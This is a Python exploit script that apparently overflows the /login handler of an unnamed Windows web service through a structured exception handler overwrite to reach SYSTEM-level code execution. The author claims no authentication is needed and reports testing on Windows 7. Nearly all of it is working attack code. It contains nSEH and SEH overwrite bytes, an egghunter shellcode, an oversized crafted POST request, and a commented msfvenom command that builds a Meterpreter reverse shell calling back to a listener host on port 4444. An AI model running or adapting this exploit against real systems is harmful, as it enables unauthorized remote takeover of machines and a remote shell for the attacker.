#!/usr/bin/python


#Author website: www.tulpa-security.com
#Author twitter: @tulpa_security

#Exploit will land you NT AUTHORITY\SYSTEM
#You do not need to be authenticated, password below is garbage
#Swop out IP, shellcode and remember to adjust '\x41' for bytes
#Tested on Windows 7 x86 Enterprise SP1

#Greetings to ozzie_offsec and carbonated
import sys
import socket
import time
import socket
from payload import buf
def shell_attack(target_machine, target_port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target_machine,target_port))

        #bad chars \x00\x0a\x0d\x26

        #msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.123.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest

        #payload size 308

        
        #pop pop ret 100159be

        nseh = "\x90\x90\xEB\x0B"
        seh = "\xbe\x59\x01\x10"

        egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


        evil =  "POST /login HTTP/1.1\r\n"
        evil += "Host: 192.168.123.132\r\n"
        evil += "User-Agent: Mozilla/5.0\r\n"
        evil += "Connection: close\r\n"
        evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        evil += "Accept-Language: en-us,en;q=0.5\r\n"
        evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
        evil += "Keep-Alive: 300\r\n"
        evil += "Proxy-Connection: keep-alive\r\n"
        evil += "Content-Type: application/x-www-form-urlencoded\r\n"
        evil += "Content-Length: 17000\r\n\r\n"
        evil += "username=admin"
        evil += "&password=aaaaa\r\n"
        evil += "\x41" * 12292 #subtract/add for payload
        evil += "w00tw00t"
        evil += "\x90" * 20
        evil += str(buf)
        evil += "\x90" * 50
        evil += "\x42" * 1614
        evil += nseh
        evil += seh
        evil += "\x90" * 20
        evil += egghunter
        evil += "\x90" * 7000

        evil = bytes(evil, 'utf-8')
        s.send(evil)
    
        s.close()
    except:
        print("Not Connected")    